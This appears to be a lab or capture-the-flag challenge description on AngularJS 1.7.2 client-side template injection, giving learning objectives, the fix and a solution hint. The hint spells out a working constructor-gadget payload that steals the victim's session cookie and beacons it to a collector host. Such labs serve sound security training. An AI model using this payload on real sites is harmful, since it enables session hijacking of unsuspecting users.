title: AngularJS 1.7.2 Client-Side Template Injection (sandbox-less)
learning_objectives: Recognise client-side template injection (CSTI): user data reflected into an AngularJS-compiled region is evaluated as an {{ }} expression, not just rendered as HTML
Understand why HTML-escaping the reflection does NOT stop CSTI — the browser decodes the entities into a text node before AngularJS parses the interpolation
Know that AngularJS 1.6+ removed the expression sandbox, so a constructor gadget reaches the Function constructor for arbitrary JavaScript
Build a {{ constructor.constructor("...")() }} gadget whose quotes survive html.escape and exfiltrate the victim's non-HttpOnly session cookie to an OOB collector

See that the fix is to keep untrusted data OUT of the Angular-compiled region (ng-non-bindable / $sce / server-side rendering that never emits user data into an interpolation context), not to escape harder
flag_hint: Submit /?name={{constructor.constructor("new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)")()}} (URL-encoded) to POST /report. HTML-escaping does not stop AngularJS 1.7.2 from evaluating the {{}} in the admin bot's browser; it beacons its session cookie to the collector. Read it via GET /oob/received, then POST /solve {"c":"<32 hex>"}.
inspired_by: The AngularJS sandbox-escape / client-side template injection class (PortSwigger CSTI research and the 1.6 sandbox removal), abstracted for local Docker with a Playwright victim bot and an OOB collector. Ships AngularJS 1.7.2 deliberately because that sandbox-less version is the vulnerability.
